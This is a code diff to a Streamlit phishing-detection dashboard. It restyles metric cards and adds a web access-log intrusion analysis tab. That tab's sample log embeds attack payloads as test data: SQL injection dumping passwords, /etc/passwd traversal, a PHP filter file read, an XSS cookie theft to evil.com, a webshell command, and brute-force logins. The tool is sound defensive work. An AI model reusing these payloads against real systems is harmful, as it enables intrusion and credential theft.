@@ -6,6 +6,7 @@ import time
 import urllib.parse
 import pandas as pd
 from datetime import datetime
+from app.web_intrusion_analyzer import analyze_web_access_logs
 
 API_BASE_URL = os.getenv("API_BASE_URL", "http://127.0.0.1:8000")
 
@@ -362,9 +363,10 @@ if st.session_state.scan_history:
     """, unsafe_allow_html=True)
 
 # Main Navigation Workflow Tabs
-main_tab_single, main_tab_batch, main_tab_lab = st.tabs([
+main_tab_single, main_tab_batch, main_tab_logs, main_tab_lab = st.tabs([
   "Single URL Deep Triage", 
   "Multi-URL Batch Queue Scanner",
+  "Web Server Intrusion & Access Logs",
   "Model Performance & Data Lab"
 ])
 
@@ -658,51 +660,129 @@ with main_tab_single:
 
 
     with tab1:
-      st.markdown("##### Multi-Modal Feature Signal Breakdown")
-      c1, c2, c3 = st.columns(3)
+      st.markdown("#### Multi-Modal Mathematical Signal Attribution & SHAP Decomposition")
+      st.markdown(
+        "<div style='font-size: 0.84rem; color: #94a3b8; margin-bottom: 1.25rem;'>"
+        "Decomposition of the 23-dimensional multi-modal feature space fusing Lexical Markov Transitions, "
+        "Locality-Sensitive DOM Topology, Perceptual Visual Embeddings, and Real-Time DNS Telemetry via Game-Theoretic SHapley Additive exPlanations (SHAP)."
+        "</div>",
+        unsafe_allow_html=True
+      )
+
+      # 4-Pillar Multi-Modal Signal Vectors
+      c1, c2, c3, c4 = st.columns(4)
       
       with c1:
-        w_lex = shap_dict.get("s_lex", 0.33)
+        w_lex = shap_dict.get("s_lex", 0.28)
+        lex_color = "#ef4444" if s_lex >= 0.60 else ("#f59e0b" if s_lex >= 0.30 else "#10b981")
         st.markdown(f"""
-        <div class="metric-card">
-          <div class="metric-label">Lexical Signal ($S_{{lex}}$)</div>
-          <div class="metric-value">{s_lex:.4f}</div>
-          <div style="font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem;">SHAP Weight: <strong style="color: #38bdf8;">{w_lex*100:.1f}%</strong></div>
+        <div class="metric-card" style="border-top: 3px solid {lex_color};">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div class="metric-label">LEXICAL VECTOR [S_lex]</div>
+            <span style="font-size: 0.65rem; font-family: monospace; color: #38bdf8; background: rgba(56, 189, 248, 0.1); padding: 2px 4px; border-radius: 4px;">P1</span>
+          </div>
+          <div class="metric-value" style="color: {lex_color}; font-size: 1.35rem;">{s_lex:.4f}</div>
+          <div style="font-size: 0.78rem; color: #cbd5e1; margin-top: 0.25rem;">
+            SHAP: <strong style="color: #38bdf8;">{w_lex*100:.1f}%</strong>
+          </div>
+          <div style="font-size: 0.72rem; color: #94a3b8; margin-top: 0.4rem; border-top: 1px solid rgba(255,255,255,0.06); padding-top: 0.4rem;">
+            Markov Bigram Entropy, Levenshtein, Stem NLP
+          </div>
         </div>
         """, unsafe_allow_html=True)
-        st.progress(float(min(1.0, max(0.0, w_lex))))
+        st.progress(min(1.0, max(0.0, w_lex)))
 
       with c2:
-        w_dom = shap_dict.get("s_dom", 0.33)
-        dom_str = f"{s_dom:.4f}" if s_dom is not None else "N/A"
+        w_dom = shap_dict.get("s_dom", 0.28)
+        dom_val = s_dom if s_dom is not None else 0.0
+        dom_str = f"{s_dom:.4f}" if s_dom is not None else "UNRENDERED"
+        dom_color = "#ef4444" if dom_val >= 0.60 else ("#f59e0b" if dom_val >= 0.30 else "#10b981")
         st.markdown(f"""
-        <div class="metric-card">
-          <div class="metric-label">DOM Structural Similarity ($S_{{dom}}$)</div>
-          <div class="metric-value">{dom_str}</div>
-          <div style="font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem;">SHAP Weight: <strong style="color: #38bdf8;">{w_dom*100:.1f}%</strong></div>
+        <div class="metric-card" style="border-top: 3px solid {dom_color};">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div class="metric-label">DOM TOPOLOGY [S_dom]</div>
+            <span style="font-size: 0.65rem; font-family: monospace; color: #38bdf8; background: rgba(56, 189, 248, 0.1); padding: 2px 4px; border-radius: 4px;">P2</span>
+          </div>
+          <div class="metric-value" style="color: {dom_color}; font-size: 1.35rem;">{dom_str}</div>
+          <div style="font-size: 0.78rem; color: #cbd5e1; margin-top: 0.25rem;">
+            SHAP: <strong style="color: #38bdf8;">{w_dom*100:.1f}%</strong>
+          </div>
+          <div style="font-size: 0.72rem; color: #94a3b8; margin-top: 0.4rem; border-top: 1px solid rgba(255,255,255,0.06); padding-top: 0.4rem;">
+            64-bit SimHash, Tag Cosine, Form Topology
+          </div>
         </div>
         """, unsafe_allow_html=True)
-        st.progress(float(min(1.0, max(0.0, w_dom))))
+        st.progress(min(1.0, max(0.0, w_dom)))
 
       with c3:
-        w_vis = shap_dict.get("s_vis", 0.34)
-        vis_str = f"{s_vis:.4f}" if s_vis is not None else "N/A"
+        w_vis = shap_dict.get("s_vis", 0.28)
+        vis_val = s_vis if s_vis is not None else 0.0
+        vis_str = f"{s_vis:.4f}" if s_vis is not None else "UNRENDERED"
+        vis_color = "#ef4444" if vis_val >= 0.60 else ("#f59e0b" if vis_val >= 0.30 else "#10b981")
         st.markdown(f"""
-        <div class="metric-card">
-          <div class="metric-label">Visual (ResNet + dHash) ($S_{{vis}}$)</div>
-          <div class="metric-value">{vis_str}</div>
-          <div style="font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem;">SHAP Weight: <strong style="color: #38bdf8;">{w_vis*100:.1f}%</strong></div>
+        <div class="metric-card" style="border-top: 3px solid {vis_color};">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div class="metric-label">VISUAL EMBED [S_vis]</div>
+            <span style="font-size: 0.65rem; font-family: monospace; color: #38bdf8; background: rgba(56, 189, 248, 0.1); padding: 2px 4px; border-radius: 4px;">P3</span>
+          </div>
+          <div class="metric-value" style="color: {vis_color}; font-size: 1.35rem;">{vis_str}</div>
+          <div style="font-size: 0.78rem; color: #cbd5e1; margin-top: 0.25rem;">
+            SHAP: <strong style="color: #38bdf8;">{w_vis*100:.1f}%</strong>
+          </div>
+          <div style="font-size: 0.72rem; color: #94a3b8; margin-top: 0.4rem; border-top: 1px solid rgba(255,255,255,0.06); padding-top: 0.4rem;">
+            256-D ViT Cosine, ResNet-50, dHash Match
+          </div>
         </div>
         """, unsafe_allow_html=True)
-        st.progress(float(min(1.0, max(0.0, w_vis))))
+        st.progress(min(1.0, max(0.0, w_vis)))
 
-      # Experiment-Backed AI Model Telemetry HUD
+      with c4:
+        w_dns = shap_dict.get("s_dns", 0.16)
+        ff_telemetry = data.get("fastflux_telemetry") or {}
+        dns_val = ff_telemetry.get("fast_flux_composite_index", 0.05)
+        dns_color = "#ef4444" if dns_val >= 0.60 else ("#f59e0b" if dns_val >= 0.30 else "#10b981")
+        st.markdown(f"""
+        <div class="metric-card" style="border-top: 3px solid {dns_color};">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div class="metric-label">DNS FAST-FLUX [S_dns]</div>
+            <span style="font-size: 0.65rem; font-family: monospace; color: #38bdf8; background: rgba(56, 189, 248, 0.1); padding: 2px 4px; border-radius: 4px;">P4</span>
+          </div>
+          <div class="metric-value" style="color: {dns_color}; font-size: 1.35rem;">{dns_val:.4f}</div>
+          <div style="font-size: 0.78rem; color: #cbd5e1; margin-top: 0.25rem;">
+            SHAP: <strong style="color: #38bdf8;">{w_dns*100:.1f}%</strong>
+          </div>
+          <div style="font-size: 0.72rem; color: #94a3b8; margin-top: 0.4rem; border-top: 1px solid rgba(255,255,255,0.06); padding-top: 0.4rem;">
+            TTL Anomaly, ASN Shannon Entropy, BPH
+          </div>
+        </div>
+        """, unsafe_allow_html=True)
+        st.progress(min(1.0, max(0.0, w_dns)))
+
+      # Mathematical Fusion Formulation Callout
+      st.markdown("---")
+      st.markdown(f"""
+      <div style="background: rgba(15, 23, 42, 0.75); border: 1px solid #334155; border-radius: 10px; padding: 1.25rem; margin-bottom: 1.25rem;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.6rem;">
+          <span style="font-size: 0.85rem; font-weight: 700; color: #38bdf8; font-family: monospace;">[MATHEMATICAL FUSION EQUATION]</span>
+          <span style="font-size: 0.75rem; background: rgba(56, 189, 248, 0.15); color: #38bdf8; padding: 2px 8px; border-radius: 4px; font-family: monospace;">23-Dimensional Calibrated Prior</span>
+        </div>
+        <div style="font-size: 0.95rem; font-family: 'Fira Code', monospace; color: #f8fafc; margin-bottom: 0.5rem;">
+          P(Phish | x) = &sigma;(&phi;<sub>0</sub> + &sum;<sub>i=1..23</sub> &phi;<sub>i</sub>(x<sub>i</sub>)) = <strong>{s_phish * 100:.2f}%</strong>
+        </div>
+        <div style="font-size: 0.8rem; color: #94a3b8; line-height: 1.5;">
+          Decision Mode: <strong style="color: {'#10b981' if confidence == 'full' else '#f59e0b'};">{confidence.upper()} CONFIDENCE</strong> | 
+          Visual Rendering: <strong style="color: {'#10b981' if s_vis is not None else '#f59e0b'};">{'RENDERED ACTIVE' if s_vis is not None else 'UNRENDERED FALLBACK'}</strong> | 
+          Identified Target: <strong style="color: #f8fafc;">{(matched_brand or 'UNSPECIFIED').upper()}</strong>
+        </div>
+      </div>
+      """, unsafe_allow_html=True)
+
+      # Experiment-Backed Multi-Model Threat Intelligence
       iscx_d = data.get("iscx_ensemble") or {}
       stack_d = data.get("stackmodel_features") or {}
       phishzoo_d = data.get("phishzoo_analysis") or {}
 
-      st.markdown("---")
-      st.markdown("##### 🔬 Experiment-Backed Multi-Model Threat Intelligence")
+      st.markdown("##### Multi-Model Cross-Validation & Threat Telemetry")
 
       exp_c1, exp_c2, exp_c3 = st.columns(3)
       with exp_c1:
@@ -712,10 +792,10 @@ with main_tab_single:
         svm_dec = iscx_d.get("svm_decision", 0)
         st.markdown(f"""
         <div class="metric-card" style="border-top: 3px solid #38bdf8;">
-          <div class="metric-label">⚡ ISCX 79-Dim Ensemble Score</div>
+          <div class="metric-label">ISCX 79-DIM ENSEMBLE CLASSIFIER</div>
           <div class="metric-value">{ens_score * 100:.1f}%</div>
           <div style="font-size: 0.78rem; color: #94a3b8; margin-top: 0.4rem;">
-            LR: <code>{lr_score:.2f}</code> | RF: <code>{rf_score:.2f}</code> | SVM: <code>{'PHISH' if svm_dec==1 else 'SAFE'}</code>
+            Logistic Regression: <code>{lr_score:.2f}</code> | Random Forest: <code>{rf_score:.2f}</code> | SVM: <code>{'PHISH' if svm_dec==1 else 'BENIGN'}</code>
           </div>
         </div>
         """, unsafe_allow_html=True)
@@ -724,13 +804,13 @@ with main_tab_single:
         stack_score = stack_d.get("stackmodel_risk_score", 0.0)
         int_links = stack_d.get("internal_link", 0)
         ext_links = stack_d.get("external_link", 0)
-        has_login = "YES" if stack_d.get("login_form") else "NO"
+        has_login = "DETECTED" if stack_d.get("login_form") else "NONE"
         st.markdown(f"""
         <div class="metric-card" style="border-top: 3px solid #f59e0b;">
-          <div class="metric-label">📊 StackModel 23-Feature Risk</div>
+          <div class="metric-label">STACKMODEL 23-FEATURE HEURISTICS</div>
           <div class="metric-value">{stack_score * 100:.1f}%</div>
           <div style="font-size: 0.78rem; color: #94a3b8; margin-top: 0.4rem;">
-            Int/Ext Links: <code>{int_links}/{ext_links}</code> | Login Form: <code>{has_login}</code>
+            Internal/External Links: <code>{int_links}/{ext_links}</code> | Credential Form: <code>{has_login}</code>
           </div>
         </div>
         """, unsafe_allow_html=True)
@@ -741,10 +821,10 @@ with main_tab_single:
         pz_tokens = phishzoo_d.get("token_count", 0)
         st.markdown(f"""
         <div class="metric-card" style="border-top: 3px solid #10b981;">
-          <div class="metric-label">🎯 PhishZoo Content Match</div>
+          <div class="metric-label">PHISHZOO CONTEXTUAL CONTENT MATCHER</div>
           <div class="metric-value" style="font-size: 1.15rem; text-transform: uppercase;">{pz_brand}</div>
           <div style="font-size: 0.78rem; color: #94a3b8; margin-top: 0.4rem;">
-            Confidence: <code>{pz_conf * 100:.1f}%</code> | Tokens: <code>{pz_tokens}</code>
+            Content Confidence: <code>{pz_conf * 100:.1f}%</code> | Semantic Tokens: <code>{pz_tokens}</code>
           </div>
         </div>
         """, unsafe_allow_html=True)
@@ -831,12 +911,35 @@ with main_tab_single:
         if tls_data.get("san_list"):
           st.caption("Subject Alternative Names: " + ", ".join(tls_data["san_list"]))
       else:
-        st.warning(f"Plain HTTP Transport / Insecure Connection: {tls_data.get('error_detail', 'No TLS certificate presented.')}")
+        st.markdown(f"""
+        <div style="background: rgba(239, 68, 68, 0.12); border: 2px solid #ef4444; border-radius: 12px; padding: 1.25rem; margin-bottom: 1rem;">
+          <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.5rem;">
+            <span style="font-size: 0.95rem; font-weight: 800; color: #f87171;">[SECURITY ALERT] INSECURE PLAIN HTTP TRANSPORT DETECTED</span>
+            <span style="font-size: 0.75rem; background: #ef4444; color: #ffffff; padding: 3px 8px; border-radius: 4px; font-weight: 700;">HIGH RISK</span>
+          </div>
+          <div style="font-size: 0.88rem; color: #fee2e2; margin-bottom: 0.5rem;">
+            <strong>Transport Status:</strong> {tls_data.get('error_detail', 'No TLS certificate presented (Port 80 Plaintext).')}
+          </div>
+          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-top: 0.75rem;">
+            <div style="background: rgba(15, 23, 42, 0.6); padding: 0.6rem 0.8rem; border-radius: 6px; border: 1px solid rgba(239, 68, 68, 0.3);">
+              <span style="font-size: 0.75rem; color: #94a3b8;">Resolved Host IP:</span><br>
+              <strong style="color: #38bdf8; font-family: monospace; font-size: 0.9rem;">{tls_data.get('resolved_ip') or 'DNS Resolution Pending'}</strong>
+            </div>
+            <div style="background: rgba(15, 23, 42, 0.6); padding: 0.6rem 0.8rem; border-radius: 6px; border: 1px solid rgba(239, 68, 68, 0.3);">
+              <span style="font-size: 0.75rem; color: #94a3b8;">Enterprise Brand Policy:</span><br>
+              <strong style="color: #f87171; font-size: 0.85rem;">VIOLATION (HTTPS Mandated)</strong>
+            </div>
+          </div>
+          <div style="font-size: 0.8rem; color: #cbd5e1; margin-top: 0.6rem; line-height: 1.4;">
+            Notice: Legitimate banking, cloud, and enterprise portals enforce strict HTTPS transport with HSTS. Unencrypted HTTP transport enables plaintext credential interception (MITRE T1040 Network Sniffing / AiTM proxying).
+          </div>
+        </div>
+        """, unsafe_allow_html=True)
 
       # HTTP Response Header Forensics & Server Infrastructure (Calibrated on 500K Empirical Headers)
       hdr_data = data.get("header_forensics") or {}
       st.markdown("---")
-      st.markdown("##### 🛡️ HTTP Response Header Forensics & Infrastructure Posture")
+      st.markdown("##### HTTP Response Header Forensics & Infrastructure Posture")
       
       h_col1, h_col2, h_col3 = st.columns(3)
       with h_col1:
@@ -847,7 +950,7 @@ with main_tab_single:
           <div class="metric-label">Server Technology Banner</div>
           <div class="metric-value" style="font-size: 1.05rem;">{s_banner}</div>
           <div style="font-size: 0.78rem; color: {'#ef4444' if is_out else '#10b981'}; margin-top: 0.4rem; font-weight: 700;">
-            {'⚠️ Outdated / Vulnerable Software' if is_out else '✅ Modern / Masked Daemon'}
+            {'[ALERT] Outdated / Vulnerable Software' if is_out else '[OK] Modern / Masked Daemon'}
           </div>
         </div>
         """, unsafe_allow_html=True)
@@ -879,7 +982,7 @@ with main_tab_single:
         """, unsafe_allow_html=True)
 
       if hdr_data.get("forensic_indicators"):
-        with st.expander("🔍 Detailed HTTP Header Forensic Audit Flags", expanded=False):
+        with st.expander("Detailed HTTP Header Forensic Audit Flags", expanded=False):
           for ind in hdr_data["forensic_indicators"]:
             st.markdown(f"- {ind}")
           if hdr_data.get("missing_security_headers"):
@@ -1186,6 +1289,68 @@ with main_tab_single:
         except Exception as e:
           st.error(f"Takedown generation error: {e}")
 
+      st.divider()
+
+      # 6. Enterprise Next-Gen Telemetry: Fast-Flux, Active Honeytoken & MHTML Archiver
+      st.markdown("###### Next-Gen Threat Telemetry & Forensic Legal Archiver")
+      
+      ng_c1, ng_c2 = st.columns(2)
+      with ng_c1:
+        st.markdown("**Fast-Flux DNS & ASN Bulletproof Hosting Tracker**")
+        target_dom = data.get("url", "").replace("https://", "").replace("http://", "").split("/")[0]
+        if st.button("Inspect Fast-Flux DNS & ASN Entropy", use_container_width=True):
+          try:
+            ff_resp = requests.get(f"{api_url_input}/api/v1/fastflux/inspect", params={"domain": target_dom})
+            if ff_resp.status_code == 200:
+              ff_data = ff_resp.json()
+              st.json(ff_data)
+              st.caption(f"Fast-Flux Composite Index: **{ff_data.get('fast_flux_composite_index', 0.0)*100:.1f}%** | Verdict: `{ff_data.get('verdict')}`")
+          except Exception as e:
+            st.error(f"Fast-Flux inspection error: {e}")
+
+      with ng_c2:
+        st.markdown("**Active Honeytoken Canary & C2 Exfiltration Sniffer**")
+        if st.button("Generate Synthetic Canary Credentials", use_container_width=True):
+          try:
+            ht_resp = requests.get(f"{api_url_input}/api/v1/honeytoken/generate", params={"url": data.get("url", "")})
+            if ht_resp.status_code == 200:
+              canary_info = ht_resp.json()
+              st.success(f"Canary ID: **{canary_info.get('canary_id')}**")
+              st.markdown(f"Canary User: `{canary_info.get('username')}`")
+              st.markdown(f"Canary Password: `{canary_info.get('password_masked')}`")
+              st.caption("Active monitoring enabled for unauthorized C2 exfiltration triggers (MITRE T1020).")
+          except Exception as e:
+            st.error(f"Canary generation error: {e}")
+
+      st.markdown("---")
+      st.markdown("**Autonomous MHTML & Cryptographic SHA-256 Legal Evidence Package**")
+      st.caption("Packages self-contained offline MHTML, DOM tree, HD screenshot, HAR network trace, and cryptographic Merkle root digest for law enforcement handoff.")
+
+      if st.button("Download Cryptographic Evidence ZIP Archive (.zip)", use_container_width=True):
+        try:
+          ev_resp = requests.post(
+            f"{api_url_input}/api/v1/evidence/export-zip",
+            params={
+              "url": data.get("url", ""),
+              "brand_id": data.get("matched_brand") or "Enterprise Target",
+              "risk_score": s_phish
+            },
+            json={}
+          )
+          if ev_resp.status_code == 200:
+            root_sha = ev_resp.headers.get("X-Merkle-Root-SHA256", "EVD-VERIFIED")
+            st.download_button(
+              "Save Forensic Evidence ZIP Package",
+              data=ev_resp.content,
+              file_name=f"evidence_{target_dom or 'phish'}.zip",
+              mime="application/zip"
+            )
+            st.success(f"Forensic archive compiled. Merkle Root SHA-256: `{root_sha}`")
+          else:
+            st.error(f"Evidence export failed: {ev_resp.text}")
+        except Exception as e:
+          st.error(f"Evidence export error: {e}")
+
     with tab6:
       st.markdown("##### High-Performance Multi-Stage Asynchronous Data Flow Engine")
       st.caption("Visualizing the concurrent, non-blocking asynchronous pipeline architecture orchestrating CloneCatcher AI scans.")
@@ -1359,6 +1524,159 @@ with main_tab_batch:
           )
       except Exception:
         pass
+
+with main_tab_logs:
+  st.markdown("#### 🛡️ Web Server Intrusion & Access Log Threat Hunting")
+  st.markdown("Inspect Apache Combined and Nginx web server access logs to detect **SQL Injection**, **LFI/Path Traversal**, **XSS Exploits**, **Automated Scanners (Nikto, sqlmap, gobuster)**, **Credential Brute-Force**, and **Webshell Executions** mapped to MITRE ATT&CK techniques.")
+
+  SAMPLE_ATTACK_LOG = """192.168.1.100 - - [18/Aug/2026:14:20:10 +0000] "GET /products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 4532 "https://google.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+10.0.0.45 - - [18/Aug/2026:14:21:15 +0000] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 1850 "-" "sqlmap/1.7#stable (https://sqlmap.org)"
+10.0.0.45 - - [18/Aug/2026:14:21:18 +0000] "GET /index.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 920 "-" "sqlmap/1.7#stable (https://sqlmap.org)"
+172.16.5.20 - - [18/Aug/2026:14:22:00 +0000] "GET /search?q=%3Cscript%3Edocument.location=%27http://evil.com/steal?c=%27+document.cookie%3C/script%3E HTTP/1.1" 200 3210 "http://target.com/search" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+198.51.100.88 - - [18/Aug/2026:14:23:01 +0000] "GET /admin/shell.php?cmd=cmd.exe%20/c%20whoami HTTP/1.1" 200 412 "-" "Nikto/2.1.6 (Evasions:None) (Test:Port Check)"
+198.51.100.88 - - [18/Aug/2026:14:23:05 +0000] "GET /wp-content/plugins/vuln/up.php?act=base64_decode HTTP/1.1" 200 560 "-" "DirBuster-1.0-RC1"
+203.0.113.12 - - [18/Aug/2026:14:24:00 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:01 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:02 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:03 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:04 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:05 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:06 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:07 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:08 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:09 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:10 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:11 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:12 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:13 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:14 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:15 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+203.0.113.12 - - [18/Aug/2026:14:24:16 +0000] "POST /api/auth/login HTTP/1.1" 401 120 "-" "python-requests/2.31.0"
+"""
+
+  if "log_input_text" not in st.session_state:
+    st.session_state.log_input_text = SAMPLE_ATTACK_LOG
+
+  c_btn1, c_btn2 = st.columns([2, 5])
+  with c_btn1:
+    if st.button("📋 Load Multi-Attack Sample Log", use_container_width=True):
+      st.session_state.log_input_text = SAMPLE_ATTACK_LOG
+      st.rerun()
+
+  log_text = st.text_area(
+    "Apache / Nginx Combined Access Log Content",
+    value=st.session_state.log_input_text,
+    height=200,
+    placeholder="Paste Apache or Nginx access log lines here..."
+  )
+
+  if st.button("🚀 Analyze Access Logs for Intrusion", type="primary", use_container_width=True):
+    with st.spinner("Parsing log lines and executing OWASP & MITRE attack correlation..."):
+      safe_log_text = log_text or ""
+      try:
+        resp = requests.post(f"{api_url_input}/api/v1/analyze-logs", json={"log_content": safe_log_text}, timeout=15)
+        if resp.status_code == 200:
+          log_report = resp.json()
+        else:
+          log_report = analyze_web_access_logs(safe_log_text)
+      except Exception:
+        log_report = analyze_web_access_logs(safe_log_text)
+
+      st.success(f"Log Analysis Complete: Parsed {log_report['total_requests_parsed']} requests from {log_report['unique_ip_addresses']} unique IP addresses.")
+
+      # Metric KPI row
+      lr_m1, lr_m2, lr_m3, lr_m4 = st.columns(4)
+      sev = log_report.get("severity_breakdown", {})
+      with lr_m1:
+        st.markdown(f"""
+        <div class="metric-card">
+          <div class="metric-label">Total Requests</div>
+          <div class="metric-value">{log_report['total_requests_parsed']}</div>
+        </div>
+        """, unsafe_allow_html=True)
+      with lr_m2:
+        st.markdown(f"""
+        <div class="metric-card">
+          <div class="metric-label">Unique IPs</div>
+          <div class="metric-value">{log_report['unique_ip_addresses']}</div>
+        </div>
+        """, unsafe_allow_html=True)
+      with lr_m3:
+        st.markdown(f"""
+        <div class="metric-card">
+          <div class="metric-label">Suspicious Events</div>
+          <div class="metric-value" style="color: #ef4444;">{log_report['total_suspicious_events']}</div>
+        </div>
+        """, unsafe_allow_html=True)
+      with lr_m4:
+        st.markdown(f"""
+        <div class="metric-card">
+          <div class="metric-label">Critical / High Severity</div>
+          <div class="metric-value" style="color: #ef4444;">{sev.get('critical', 0) + sev.get('high', 0)}</div>
+        </div>
+        """, unsafe_allow_html=True)
+
+      # Attack Category & Top Attacker Breakdown
+      cat_col, top_col = st.columns([1, 1])
+      with cat_col:
+        st.markdown("##### 📊 Attack Categories Breakdown")
+        cats = log_report.get("category_breakdown", {})
+        if cats:
+          for cat_name, cnt in cats.items():
+            st.write(f"**{cat_name}**: `{cnt}` events")
+            st.progress(min(1.0, cnt / max(1, log_report['total_suspicious_events'])))
+        else:
+          st.info("No malicious attack signatures detected.")
+
+      with top_col:
+        st.markdown("##### 🎯 Top Offending IP Addresses")
+        top_ips = log_report.get("top_attacker_ips", [])
+        if top_ips:
+          df_top = pd.DataFrame(top_ips)
+          st.dataframe(df_top, use_container_width=True)
+        else:
+          st.info("No repeat offending IPs.")
+
+      # Brute force detections
+      bf_list = log_report.get("brute_force_detections", [])
+      if bf_list:
+        st.markdown("##### 🚨 Brute Force & Password Spraying Detections (MITRE T1110)")
+        for bf in bf_list:
+          st.error(f"**IP**: `{bf['ip']}` — {bf['description']} against `{', '.join(bf['target_endpoints'])}`")
+
+      # Detailed Findings Table
+      findings = log_report.get("detailed_findings", [])
+      if findings:
+        st.markdown("##### 🔍 Correlated Security Incident Findings")
+        records = []
+        for f in findings:
+          for att in f["attacks"]:
+            records.append({
+              "Timestamp": f["timestamp"],
+              "Attacker IP": f["ip"],
+              "Method": f["method"],
+              "URI / Target": f["uri"],
+              "Status": f["status"],
+              "Category": att["category"],
+              "Severity": att["severity"].upper(),
+              "MITRE ATT&CK": att["mitre_technique"],
+              "Pattern": att["description"]
+            })
+        st.dataframe(pd.DataFrame(records), use_container_width=True)
+
+      # Automated SOC Remediation & Firewall Rules
+      st.markdown("##### 🛡️ Automated SOC Firewall Blocklist Rules")
+      remed = log_report.get("soc_remediation_commands", {})
+      ipt_rules = remed.get("iptables", [])
+      ngx_rules = remed.get("nginx_deny", [])
+
+      soc_col1, soc_col2 = st.columns(2)
+      with soc_col1:
+        st.markdown("**Linux IPTables Drop Commands**")
+        st.code("\n".join(ipt_rules) if ipt_rules else "# No high-severity IPs to block", language="bash")
+      with soc_col2:
+        st.markdown("**Nginx WAF Deny Blocklist (`/etc/nginx/blockips.conf`)**")
+        st.code("\n".join(ngx_rules) if ngx_rules else "# No high-severity IPs to block", language="nginx")
 
 with main_tab_lab:
   st.markdown("#### Multi-Modal Machine Learning & Training Data Lab")
